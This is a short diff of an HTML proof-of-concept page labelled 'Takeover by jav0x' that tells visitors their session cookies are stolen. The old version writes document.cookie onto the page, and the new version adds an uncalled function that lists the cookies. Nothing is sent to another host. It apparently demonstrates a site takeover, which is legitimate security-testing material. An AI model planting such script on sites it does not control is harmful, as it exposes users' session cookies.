@@ -1,5 +1,14 @@
 <html>
-<H1>Takeover by jav0x</H1>
-<h2>These are you stolen Session Cookies:</h2>
-<script>document.write(document.cookie)</script>
+<H2>Takeover by jav0x</H2>
+<h3>These are you stolen Session Cookies:</h3>
+<script>
+function listCookies() {
+    var theCookies = document.cookie.split(';');
+    var aString = '';
+    for (var i = 1 ; i <= theCookies.length; i++) {
+        aString += i + ' ' + theCookies[i-1] + "\n";
+    }
+    return aString;
+}
+</script>
 </html>
